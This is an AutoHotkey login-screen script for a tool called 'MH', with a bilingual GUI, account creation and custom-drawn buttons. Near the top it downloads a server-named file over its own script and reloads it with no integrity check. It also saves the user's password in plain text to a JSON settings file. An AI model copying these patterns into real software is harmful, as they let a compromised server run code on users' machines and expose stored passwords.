boVCrObdNWZVBqbzYy61PyIwTlf3opLfWTnk28TXGDsmqJjn9o1Odk+OckSibtn5RwQHFFEInmfTek+hB88niDMvyylVknuV47nUAbJRzv3+eFQKKVujfSBHf7DM7wkOKMu8WLN7ce9mcWvfY49dDiYv8WLYuKVo6EfVmNtW42wpyEc6uycmhxdXplbN2noMVdrstZD2PbOPAJJdD57PCOTj8V1m+5sVtfGGm5X6nCkty4iIyihert/UdmzXvzpp/R2/krN0CNZNJXV3nsjb8E9EqiaWpVaOpVautXaejVrtZ+radLVtJhqWqxfN7MdXHjEcFFmzvjZC/wAfLfZruY1Olh9Q6VOioxU9Gx2oW1zC9fFMZDJQRkIfhBJuoZH28XSNslUc23dYyPTuh0WdLhtqw2yDYHsdPPiEMIFaefEN0smb9waTUz5eCDwrZ1TsJ29Ug/eBe9z9Bh08xQE4MbjEsSUvIn4xM+793SZmjebmL7YYUozNK40gT7Q3XB/lQZVVf1dV0+/YHxoSj48Awrl4NTX3SyW4l4snyPicV91hG2vX8AnLE5wNHY0I3Oi6OZYZu7nI6EdLmgGyqXOHvVkjy/jSd191bVfdJUFfUjAHRrl88e4Dc1DhdcmHtImhgSXS1qJJ6i2+/I2WiRawL6eamhkpAQEFwfqn1IsJ0CQOz/PYnWmppe1dPT8V88sqFWEyxUKBaKxFtbo2SxRXiG3sTXrGn2j1ZkluiQYHK3UA01MO7aasI1gXCeP4WDi2Km04dCIDxYI1m9bbyUV/L7zJMwy7htdbUO0Igiv3Nr67knJ1NyUTMZsmcimTFAK7l6i6tucghraKHWcq1t/Sjpf0ZPL18VlFdLaOum9Ss4dKjb8psrGaECbALNL+EZXh8QoskSHrGeWnJxVIxyXgnL53Ihg7Hw2287pZVgM2tlLqRPJZKFiQha6oYhiI60dXN+wOxvhaT+uJwO6If+nA+ui1PVPmLnlHD1N6+jlT8/MzctkvBu3WzYb/fs3Ec1gJDPzCJhFpA0iBL0H7XkQ5X7Ayn7fdpg7xBAFMXCEWrgG4vB+W7b5bdHfv2UrDo/fZuykCMQAtc3EBQr3RCAx7l6HfPyCDxPCwsPDiUFBOLi1Uv9eKS3/GwZQGF1HB8r4AAAAAElFTkSuQmCC")
}
Save := new OBJSave("SettingsOBJ.json")
Save.Login := 7
Save.Ling := Save.Ling = "" ? "por" : Save.Ling
LoadGDIplus()
Data := GuiLoad()
If (Save.Login != Data["MHLogin"]["Version"] && Data["MHLogin"]["Version"]){
Gdip_GetFile(Data["MHLogin"]["Link"], A_ScriptName)
reload
}
LoadImages()
CreateGui(){
MHGui := new classGui("MyGui","MHGui","-DPIScale -Caption -0x20000 +LastFound")
MHGui.GuiSetFont(9 - A_Args.FontDPI, "Tahoma", "cE6E6E6 bold")
MHGui.Add("HBITMAP", 01, "x0  y0 w330 +BackgroundTrans")
MHGui.Add("HBITMAP", 02, "x0  y0  +BackgroundTrans")
MHGui.Add("CustomText", 01, "x45 y3")
MHGui.Add("IMGButton", 01, "x302 y0 ")
if (Save.Ling = "por"){
MHGui.Add("HBITMAP"  , { "Label": "por", "W": 31, "H": 20, "PNG" : "PorS", "Window": ""}, "x230 y1")
MHGui.Add("IMGButton", { "Label": "eng", "W": 31, "H": 20, "PNG1": "Eng" , "PNG2": "EngH", "Func": "SetLing", "Window": ""}, "x+5 y1")
} else {
MHGui.Add("IMGButton", { "Label": "por", "W": 31, "H": 20, "PNG1": "Por" , "PNG2": "porH", "Func": "SetLing", "Window": ""}, "x230 y1")
MHGui.Add("HBITMAP"  , { "Label": "eng", "W": 31, "H": 20, "PNG" : "EngS", "Window": ""}, "x+5 y1")
}
MHGui.NewParent("Login","-caption -DPIScale ")
MHGui.GuiSetColor(242424,333333,"Login")
MHGui.Add("HBITMAP", 03, "x55 y40 +BackgroundTrans")
MHGui.Add("IMGButton", 02, "x250 y249")
MHGui.Add("DefText", 01, "+Section x22 y105 w60 Right")
MHGui.Add("Edit", 01, "w184 h18 x+6 ys-3 -E0x200 +Border")
MHGui.Add("DefText", 02, "xs y+5 w60 Right")
MHGui.Add("Edit", 02, "w184 h18 x+6 ys+19 -E0x200 +Border Password")
MHGui.Add("Button2", 01, "x115 y+15")
MHGui.Add("Button2", 02, "x85  y+10")
MHGui.NewParent("Create","-caption -DPIScale ")
MHGui.GuiSetColor(242424,333333,"Create")
MHGui.Show("Hide x0 y25 w330 h275","Create")
MHGui.NewParent("Games","-caption -DPIScale ")
MHGui.GuiSetColor(242424,333333,"Games")
MHGui.Show("Hide x0 y25 w330 h275","Games")
MHGui.Controls["Edit01"].Focus()
MHGui.Show("w330 h300")
MHGui.Show("x0 y25 w330 h275","Login")
}
F01(Hwnd) {
static Make
Save.Save(Save)
1 := "Login"
2 := Save.Config.Edit01
3 := Save.Config.Edit02
4 := Save.Ling
5 := A_PtrSize=8 ? "x64" : "x32"
6 := A_Args.JS.Token
Data.Send := Data.Login
Loop, 6
Data.Send := StrReplace(Data.Send, "!" A_Index, %A_Index%)
r := TryLogin(Data.Send, 01)
If (r.Type == 420)
MsgData(r.error, 4112)
}
F07() {
1 := "Update"
2 := MHGui.Controls.Edit03.GetText()
3 := MHGui.Controls.Edit04.GetText()
4 := MHGui.Controls.Edit05.GetText()
5 := MHGui.Controls.Edit07.GetText()
6 := MHGui.Controls.Edit08.GetText()
7 := Save.Ling
8 := A_Args.JS.Token
if (!IsValidEmail(MHGui.Controls.Edit04.GetText())){
MsgData(02, 4112)
Return
}
If (MHGui.Controls.Edit05.GetText() != MHGui.Controls.Edit06.GetText()){
MsgData(03, 4112)
Return
}
Data.Send := Data.Create
Loop, 8
Data.Send := StrReplace(Data.Send, "!" A_Index, %A_Index%)
r := TryCreate(Data.Send, 01)
If (r.Type == 420)
MsgData(r.error, 4112)
}
F02(Hwnd) {
If (!A_Args.CreateAccount){
MHGui.Add("DefText", 03, "+Section x5 y60 w115 Right")
MHGui.Add("DefText", 04, "xs y+8 w115 Right")
MHGui.Add("DefText", 05, "xs y+7 w115 Right")
MHGui.Add("DefText", 06, "xs y+8 w115 Right")
MHGui.Add("DefText", 07, "xs y+7 w115 Right")
MHGui.Add("DefText", 08, "xs y+7 w115 Right")
MHGui.Add("Edit", 03, "w190 h18 xs+120 ys-3 -E0x200 +Border")
MHGui.Add("Edit", 04, "w190 h18  y+4 -E0x200 +Border")
MHGui.Add("Edit", 05, "w190 h18  y+4 -E0x200 +Border Password")
MHGui.Add("Edit", 06, "w190 h18  y+4 -E0x200 +Border Password")
MHGui.Add("Edit", 07, "w190 h18  y+4 -E0x200 +Border")
MHGui.Add("Edit", 08, "w190 h18  y+4 -E0x200 +Border")
MHGui.Add("Button1", 01, "x60 y235")
MHGui.Add("Button1", 02, "x+15")
A_Args.CreateAccount := 1
}
MHGui.Controls.CustomText01.Set({eng: "Create Account", por: "Criar Conta"})
MHGui.Show(,"Create")
MHGui.Hide("Login")
}
F08() {
MHGui.Controls.CustomText01.Set({por: "Tela de Login", eng: "Login Screen"})
MHGui.Show(,"Login")
MHGui.Hide("Create")
}
SetLing(Hwnd) {
Save.Ling := A_GuiControl
Save.Save(Save)
Gui, MyGui:Destroy
A_Args.CreateAccount := ""
CreateGui()
}
F03(Hwnd) {
Save.Save(Save)
ExitApp
}
F04(Hwnd) {
Run % Data.Link.02
}
F05() {
Save.Write("Config","Edit01", A_GuiControl)
}
F06() {
Save.Write("Config","Edit02", A_GuiControl)
}
OnMessage(0x200, "ButtonHover")
ButtonHover( wparam, lparam, msg ) {
Static MToolTip, HoverOn, Key, Hand := DllCall("LoadCursor", "ptr", 0, "ptr", 32649), Help := DllCall("LoadCursor", "ptr", 0, "ptr", 32651), Wait := DllCall("LoadCursor", "ptr", 0, "ptr", 32650), Cross := DllCall("LoadCursor", "ptr", 0, "ptr", 32515), Arrow := DllCall("LoadCursor", "ptr", 0, "ptr", 32512)
MouseGetPos,VarX,VarY,, ctrl , 2
GControl := MHGui.BTHwnd["H" ctrl] ? MHGui.BTHwnd["H" ctrl] : A_GuiControl
if (!HoverOn && GControl && MHGui.Controls[GControl].Hover = 1)
MHGui.Controls[GControl].Draw_Hover(), HoverOn := 1, Key := GControl
else if (HoverOn = 1 && GControl != Key)
MHGui.Controls[Key].Draw_Default(), HoverOn := 0, Key := ""
if (Key)
SetTimer, ButtonHoverOFF , -100
if (GControl && Mouse := MHGui.Controls[GControl].Mouse) {
if (Mouse)
Data.CurrentCursor := %Mouse%, DllCall("SetCursor", "ptr", %Mouse%)
}
else if (!Mouse && Data.CurrentCursor )
Data.CurrentCursor := 0, DllCall("SetCursor", "ptr", Arrow)
If (MHGui.Controls[GControl].Bar = 1) {
X := MHGui.Controls[GControl].X
Y := MHGui.Controls[GControl].Y
AClick := (VarX - X) > 100 ? 100 : (VarX - X) < 0 ? 0 : (VarX - X)
MToolTip := 1
ToolTip, % AClick
}
else If (MToolTip = 1) {
MToolTip := 0
ToolTip
}
if (wparam=1 && !A_Args.MoveTest)
PostMessage, 0xA1, 2,,, A
}
OnMessage(0x20A, "Funcs")
Funcs(wparam, lparam, msg){
MouseGetPos,,,, ctrl , 2
GControl := MHGui.BTHwnd["H" ctrl]
If (MHGui.Controls[GControl].Bar = 1){
wparam := wparam = 7864320 ? 1 : -1
MHGui.Controls[GControl].Set_Pin(MHGui.Controls[GControl].AClick + wparam, 1)
}
}
OnMessage(0x20,  "WM_SETCURSOR")
WM_SETCURSOR(wParam, lParam) {
HitTest := lParam & 0xFFFF
if (HitTest=1 && Data.CurrentCursor!=0) {
DllCall("SetCursor", "ptr", Data.CurrentCursor)
return true
}
}
ButtonHoverOFF() {
MouseGetPos,,,VarWin,,2
WinGetTitle, title, ahk_id %VarWin%
if (title != "MyGui")
ButtonHover(0, 0, "Timer")
}
OnMessage(0x204, "GuiContext")
GuiContext( wparam, lparam, msg, hwndID ) {
}
OnMessage(0x102, "WMChar")
WMChar(wP) {
Switch SubStr(A_GuiControl, 1 , 3)
{
Case "Num":
Stat := 1
Case "AnZ":
Stat := 2
Default:
Stat := 0
}
If (Stat == 0)
Return
If ( Stat == 1){
If (wP=8)
Return
wP := Chr(wP)
If (wP is not digit) {
Gui, Submit, NoHide
Return, 0
}
}
If ( Stat == 2){
vPos := RegExMatch(Chr(wP), "[A-Za-z]")
If (wP=32 || wP=8)
Return
If (!vPos) {
Gui, Submit, NoHide
Return, 0
}
}
}
class classGui {
__new(Name, Var, Options:="+LastFound") {
This.Var      := Var
This.Name     := Name
This.Title    := Name
This.BTHwnd   := Object()
This.Controls := Object()
This.Child    := Object()
Gui, % This.Name ": " Options " hwndHwnd"
This.Hwnd := Hwnd
Gui, % This.Name ":Default"
This.GuiSetMargins()
}
NewParent(Name, Options:="+LastFound", Window:="", Title:="") {
Title := Title ? Title : Name
Hwnd := Window ? This.Child[%Window%.Hwnd] : This.Hwnd
Gui, % Name ":New", % Options " +parent" This.Hwnd
This.Child[Name] := {Name: Name, Title: Title, Hwnd: WinExist()}
DF := This.DefaultFont
Gui, % Name ":Font", % "s" DF.Size " " DF.Options, % DF.Font
}
Add(Type,Valor,Options:="") {
obj := Valor
if (!IsObject(obj))
obj := Data["Add"][Type][obj]
try
Label := RegExReplace(obj.Label, "[^A-z0-9_]")
Catch
Label := Type Valor
try
Window := obj.Window
If (!Window)
Window := This.Name
v := This[Type]
This.Controls[Label] := new v(obj,Options,Label,Window,This.Var)
}
ClearContents() {
for Name, CtrlObj in This.TextCtrl
CtrlObj.SetText()
}
CheckForContents() {
for Name, CtrlObj in This.TextCtrl
if(CtrlObj.GetText()!="")
return 1
return 0
}
Activate() {
WinActivate % "ahk_id " This.Hwnd
}
Show(Options:="",Window:="") {
Window := Window ? Window : This.Name
if(This.GuiX!="" and This.GuiY!="")
Gui, % Window ":Show", % Options " x" This.GuiX " y" This.GuiY, % This.Title
else
Gui, % Window ":Show", % Options, % This.Title
}
Hide(Window:="") {
Window := Window ? Window : This.Name
Gui, % Window ":Hide"
}
Minimize() {
Window := Window ? Window : This.Name
WinMinimize % "ahk_id " This.Hwnd
}
GuiSetTitle(NewTitle:="") {
This.Title := NewTitle
Gui, % This.Name ":Show",, % This.Title
return
}
GuiSetMargins(X:=4, Y:=4) {
Gui, % This.Name ":Margin", %X%, %Y%
}
GuiSetFont(Size:=10, Font:="", Options:="", Window:="") {
Window := Window ? Window : This.Name
If (Window = This.Name)
This.DefaultFont := {Size: Size, Font: Font, Options: Options}
Gui, % Window ":Font", s%Size% %Options%, %Font%
}
GuiSetColor(Background:="", Foreground:="", Window:="") {
Window := Window ? Window : This.Name
Gui, % Window ":Color", %Background%, %Foreground%
}
GuiSetOptions(Options, Window:="") {
Window := Window ? Window : This.Name
Gui, % Window ":" Options
}
GuiSetCoords(X, Y) {
This.GuiX := X
This.GuiY := Y
}
GuiSetPos(X, Y) {
DetectHiddenWindows, On
WinMove, % "ahk_id " This.Hwnd,, % x, % y
DetectHiddenWindows, Off
}
AddTextField(CtrlType, LabelText, FieldText:="", Width:="", TextOptions:="", FieldOptions:="", DataControl:=1) {
This.Add("Text", LabelText, "+Section w" Width " " TextOptions,, DataControl)
This.Add(CtrlType, FieldText, "w" Width " " FieldOptions, LabelText, DataControl)
}
class HBITMAP {
__New(obj,Options,Label,Window,vGlobal) {
This.Window := Window
This.PNG := obj.PNG
Gui, % This.Window ": Add", Picture, % Options " HwndHwnd", % "HBITMAP:*" A_Args.PNG[This.PNG]
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
}
}
class Edit {
__New(obj,Options,Label,Window,vGlobal) {
static  i:=1
Try
Load := Save[obj.Load][Label]
Try
Func := obj.Func
Try
Block := obj.Block
if (Block)
Options .= " v" Block i++
if (Func)
Options .= " g" Func
This.Hwnd := This.Create(Window, Options, Load)
This.Window := Window
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
}
Create(Window, Options, Load){
static
Gui, % Window ": Add", Edit, % Options " HwndHwnd", % Load
Return Hwnd
}
GetText() {
ControlGetText, T,, % "ahk_id " This.Hwnd
return T
}
SetText(T:="") {
ControlSetText,, % T, % "ahk_id " This.Hwnd
}
Focus() {
ControlFocus,, % "ahk_id " This.Hwnd
}
}
class DefText {
__New(obj,Options,Label,Window,vGlobal) {
This.Window := Window
Try
FontOptions := obj.FontOptions
Try
Font := obj.Font
If (FontOptions && Font)
Gui, % This.Window ": Font", % FontOptions, % Font
Gui, % This.Window ": Add", Text, % "0x200 HwndHwnd " Options, % obj[Save.Ling]
If (FontOptions || Font){
DF := %vGlobal%["DefaultFont"]
Gui, % Window ":Font", % "s" DF.Size " " DF.Options, % DF.Font
}
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
}
}
class Button1 {
__New(obj,Options,Label,Window,vGlobal) {
This.W := obj.W
This.H := obj.H
This.BColor := "0x" obj.GuiColor
This.Color := "0x" obj.Color
This.FColorTop := "0x" obj.FColor
This.FColorBottom := "0x" obj.FColorB
This.Font := obj.Font
This.Font_Size := obj.FOptions
This.Roundness := obj.Roundness
This.Func := obj.Func
This.Label := Label
This.Window := Window
This.Mouse := "Hand"
This.Hover := 1
This.Create_Bitmap(obj[Save.Ling])
Gui , % Window ": Add" , Picture , % Options " w" This.W " h" This.H " hwndHwnd 0xE", % Label
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
BD := THIS.Pressed.BIND( THIS )
GUICONTROL +G , % Hwnd , % BD
This.Draw_Default()
}
Pressed() {
if (!This.Draw_Pressed())
return
If (This.Func){
FuncRun := This.Func
%FuncRun%(This.Hwnd,A_GuiControl)
}
}
Draw_Pressed() {
SetImage( This.Hwnd , This.Pressed_Bitmap )
A_Args.MoveTest := 1
While( GetKeyState( "LButton" ))
sleep , 10
A_Args.MoveTest := 0
MouseGetPos,,,, ctrl , 2
if( This.Hwnd != ctrl ){
This.Draw_Default()
return False
} else {
This.Draw_Hover()
return true
}
}
Draw_Default() {
SetImage( This.Hwnd , This.Default_Bitmap )
}
Draw_Hover() {
SetImage( This.Hwnd , This.Hover_Bitmap )
}
Editor(Text,FColorTop:="") {
If (FColorTop)
This.FColorTop := "0xFF" FColorTop
DeleteObject( This.Hover_Bitmap )
DeleteObject( This.Pressed_Bitmap )
DeleteObject( This.Default_Bitmap )
This.Create_Bitmap(Text)
SetImage( This.Hwnd , This.Default_Bitmap )
}
Create_Bitmap(Text) {
pBitmap:=Gdip_CreateBitmap( This.W , This.H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.BColor )
Gdip_FillRectangle( G , Brush , -1 , -1 , This.W+2 , This.H+2 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF61646A" , "0xFF2E2124" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 0 , 1 , This.W , This.H-3 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF4C4F54" , "0xFF35373B" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 1 , 2 , This.W-2 , This.H-5 , This.Roundness )
Gdip_DeleteBrush( Brush )
Pen := Gdip_CreatePen( "0xFF1A1C1F" , 1 )
Gdip_DrawRoundedRectangle( G , Pen , 0 , 0 , This.W , This.H-2 , This.Roundness )
Gdip_DeletePen( Pen )
Brush := Gdip_BrushCreateSolid( This.FColorBottom )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x1 y2 " , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.FColorTop )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x0 y1 " , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Default_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DisposeImage(pBitmap)
pBitmap:=Gdip_CreateBitmap( This.W , This.H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.BColor )
Gdip_FillRectangle( G , Brush , -1 , -1 , This.W+2 , This.H+2 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF61646A" , "0xFF2E2124" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 0 , 1 , This.W , This.H-3 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF55585D" , "0xFF3B3E41" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 1 , 2 , This.W-2 , This.H-5 , This.Roundness )
Gdip_DeleteBrush( Brush )
Pen := Gdip_CreatePen( "0xFF1A1C1F" , 1 )
Gdip_DrawRoundedRectangle( G , Pen , 0 , 0 , This.W , This.H-2 , This.Roundness )
Gdip_DeletePen( Pen )
Brush := Gdip_BrushCreateSolid( This.FColorBottom )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x1 y2" , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.FColorTop )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x0 y1" , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Hover_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DisposeImage(pBitmap)
pBitmap:=Gdip_CreateBitmap( This.W , This.H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.BColor )
Gdip_FillRectangle( G , Brush , -1 , -1 , This.W+2 , This.H+2 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 0 , 0 , This.W , This.H , "0xFF2A2C2E" , "0xFF45474E" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 0 , 1 , This.W , This.H-3 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( "0xFF2A2C2E" )
Gdip_FillRoundedRectangle( G , Brush , 0 , 0 , This.W , This.H-8 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( "0xFF46474D" )
Gdip_FillRoundedRectangle( G , Brush , 0 , 7 , This.W , This.H-8 , This.Roundness )
Gdip_DeleteBrush( Brush )
Brush := Gdip_CreateLineBrushFromRect( 5 , 3 , This.W ,This.H-7 , "0xFF333639" , "0xFF43474B" , 1 , 1 )
Gdip_FillRoundedRectangle( G , Brush , 1 , 2 , This.W-3 , This.H-6 , This.Roundness )
Gdip_DeleteBrush( Brush )
Pen := Gdip_CreatePen( "0xFF1A1C1F" , 1 )
Gdip_DrawRoundedRectangle( G , Pen , 0 , 0 , This.W , This.H-2 , This.Roundness )
Gdip_DeletePen( Pen )
Brush := Gdip_BrushCreateSolid( This.FColorBottom )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x1 y3" , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.FColorTop )
Gdip_TextToGraphics( G , Text , "s" This.Font_Size " Center vCenter c" Brush " x0 y2" , This.Font , This.W , This.H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Pressed_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap( pBitmap )
Gdip_DisposeImage( pBitmap )
}
}
class Button2 {
__New(obj,Options,Label,Window,vGlobal) {
This.W := obj.W
This.H := obj.H
This.Font := obj.Font
This.FontOptions := obj.FontOptions
This.Text_Color:= "0x" obj.FontColor
This.Gui_Color := "0x" obj.GuiColor
This.Line_Color:= "0x" obj.LineColor
This.Default_Color:= "0x" obj.DefaultColor
This.Hover_Color  := "0x" obj.HoverColor
This.Roundness := obj.Roundness
This.Func := obj.Func
This.Label := Label
This.Window:= Window
This.Mouse := "Hand"
This.Hover := 1
This.Create_Bitmap(obj[Save.Ling], This.W, This.H)
Gui , % Window ": Add" , Picture , % Options " w" This.W " h" This.H " hwndHwnd 0xE", % Label
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
BD := THIS.Pressed.BIND( THIS )
GUICONTROL +G , % Hwnd , % BD
This.Draw_Default()
}
Pressed() {
if (!This.Draw_Pressed())
return
If (This.Func){
FuncRun := This.Func
%FuncRun%(This.Hwnd)
}
}
Draw_Pressed() {
SetImage( This.Hwnd , This.Default_Bitmap )
A_Args.MoveTest := 1
While(GetKeyState("LButton"))
sleep , 10
A_Args.MoveTest := 0
MouseGetPos,,,, ctrl , 2
if( This.Hwnd != ctrl ) {
This.Draw_Default()
return False
} else {
This.Draw_Hover()
return true
}
}
Draw_Default() {
SetImage( This.Hwnd , This.Default_Bitmap )
}
Draw_Hover() {
SetImage( This.Hwnd , This.Hover_Bitmap )
}
NewModel(Type) {
obj := Data["Add"]["Button2"][Type]
DeleteObject( This.Hover_Bitmap )
DeleteObject( This.Default_Bitmap )
This.Text_Color:= "0x" obj.FontColor
This.Gui_Color := "0x" obj.GuiColor
This.Line_Color:= "0x" obj.LineColor
This.Default_Color:= "0x" obj.DefaultColor
This.Hover_Color  := "0x" obj.HoverColor
This.Roundness := obj.Roundness
This.Func := obj.Func
This.Create_Bitmap(obj[Save.Ling], This.W, This.H)
This.Draw_Default()
}
Create_Bitmap(Text, W, H) {
pBitmap:=Gdip_CreateBitmap( W , H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.Gui_Color )
Gdip_FillRectangle( G , Brush , -1 , -1 , W+2, H+2)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Line_Color )
Gdip_FillRoundedRectangle( G , Brush , 0 , 0 , W-1, H-1, This.Roundness)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Default_Color )
Gdip_FillRoundedRectangle( G , Brush , 2 , 2 , W-5, H-5, This.Roundness-3)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Text_Color )
Gdip_TextToGraphics( G , Text , "s" This.FontOptions " Center vCenter c" Brush " x0 y2 " , This.Font , W , H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Default_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DisposeImage(pBitmap)
pBitmap:=Gdip_CreateBitmap( W , H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G , 2 )
Brush := Gdip_BrushCreateSolid( This.Gui_Color )
Gdip_FillRectangle( G , Brush , -1 , -1 , W+2, H+2)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Line_Color )
Gdip_FillRoundedRectangle( G , Brush , 0 , 0 , W-1, H-1, This.Roundness)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Hover_Color )
Gdip_FillRoundedRectangle( G , Brush , 2 , 2 , W-5, H-5, This.Roundness-3)
Gdip_DeleteBrush( Brush )
Brush := Gdip_BrushCreateSolid( This.Text_Color )
Gdip_TextToGraphics( G , Text , "s" This.FontOptions " Center vCenter c" Brush " x0 y2" , This.Font , W , H-1 )
Gdip_DeleteBrush( Brush )
Gdip_DeleteGraphics( G )
This.Hover_Bitmap := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DisposeImage(pBitmap)
}
}
class IMGButton {
__New(obj,Options,Label,Window,vGlobal) {
This.W := obj.W
This.H := obj.H
This.D_Bitmap := A_Args.PNG[obj.PNG1]
This.H_Bitmap := A_Args.PNG[obj.PNG2]
This.Func     := obj.Func
This.Label    := Label
This.Window := Window
This.Mouse := "Hand"
This.Hover := 1
Gui, % Window ": Add" , Picture , % Options " w" This.W " h" This.H " 0xE hwndHwnd", % Label
This.Hwnd := Hwnd
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
BD := THIS.Pressed.BIND( THIS )
GUICONTROL +G , % Hwnd , % BD
This.Draw_Default()
}
Pressed() {
if (!This.Draw_Pressed())
return
If (This.Func){
FucRun := This.Func
%FucRun%(This.Hwnd,A_GuiControl)
}
}
Draw_Default() {
SetImage( This.Hwnd , This.D_Bitmap )
}
Draw_Hover() {
SetImage( This.Hwnd , This.H_Bitmap )
}
Draw_Pressed() {
SetImage( This.Hwnd , This.D_Bitmap )
A_Args.MoveTest := 1
While( GetKeyState( "LButton" ) )
sleep , 10
A_Args.MoveTest := 0
MouseGetPos,,,, ctrl , 2
if( This.Hwnd != ctrl ) {
return False
} else {
SetImage( This.Hwnd , This.H_Bitmap )
return True
}
}
}
class CustomText {
__New(obj,Options,Label,Window,vGlobal) {
This.W := obj.W
This.H := obj.H
This.FontOptions := obj.FontOptions
This.Font := obj.Font
This.pBitmap:=Gdip_CreateBitmap( This.W, This.H )
This.G := Gdip_GraphicsFromImage( This.pBitmap )
Gdip_SetSmoothingMode( This.G, 2 )
This.BrushBKColor := Gdip_BrushCreateSolid( "0x" obj.GuiColor )
This.BrushText    := Gdip_BrushCreateSolid( "0x" obj.FontColor )
Gdip_FillRectangle( This.G, This.BrushBKColor, -1, -1, This.W+1, This.H+1)
Gdip_TextToGraphics( This.G, obj[Save.Ling], This.FontOptions " c" This.BrushText, This.Font, This.W-1, This.H)
This.PNG := Gdip_CreateARGBHBITMAPFromBitmap(This.pBitmap)
Gui, % Window ": Add", Picture, % Options " hwndHwnd", % "HBITMAP:*" This.PNG
This.Hwnd := Hwnd
This.Window := Window
%vGlobal%["BTHwnd"]["H" Hwnd] := Label
}
Set(obj) {
ForDelete := This.PNG
Gdip_FillRectangle( This.G, This.BrushBKColor, -1, -1, This.W+1, This.H+1)
Gdip_TextToGraphics( This.G, obj[Save.Ling], This.FontOptions " c" This.BrushText, This.Font, This.W-1, This.H)
This.PNG := Gdip_CreateARGBHBITMAPFromBitmap(This.pBitmap)
SetImage( This.Hwnd , This.PNG )
DeleteObject( ForDelete )
}
Editor(PNG) {
pBitmap:=Gdip_CreateBitmap( W, H )
G := Gdip_GraphicsFromImage( pBitmap )
Gdip_SetSmoothingMode( G, 2 )
BrushBKColor := Gdip_BrushCreateSolid( "0x" This.GuiColor )
BrushText    := Gdip_BrushCreateSolid( "0x" This.FontColor )
Gdip_FillRectangle( G, BrushBKColor, -1, -1, W+1, H+1)
Gdip_TextToGraphics( G, obj[Save.Ling], This.FontOptions " c" BrushText, This.Font, W-1, H)
This.PNG := Gdip_CreateARGBHBITMAPFromBitmap(pBitmap)
Gdip_DeleteBrush( BrushBKColor )
Gdip_DeleteBrush( BrushText )
Gdip_DeleteGraphics( G )
Gdip_DisposeImage(pBitmap)
SetImage( This.Hwnd , This.PNG )
}
}
}
Class classGuiColors {
Static Attached := {}
Static HandledMessages := {Edit: 0, ListBox: 0, Static: 0}
Static MessageHandler := "classGuiColors_OnMessage"
Static WM_CTLCOLOR := {Edit: 0x0133, ListBox: 0x134, Static: 0x0138}
Static HTML := {AQUA: 0xFFFF00, BLACK: 0x000000, BLUE: 0xFF0000, FUCHSIA: 0xFF00FF, GRAY: 0x808080, GREEN: 0x008000, LIME: 0x00FF00, MAROON: 0x000080, NAVY: 0x800000, OLIVE: 0x008080, PURPLE: 0x800080, RED: 0x0000FF, SILVER: 0xC0C0C0, TEAL: 0x808000, WHITE: 0xFFFFFF, YELLOW: 0x00FFFF}
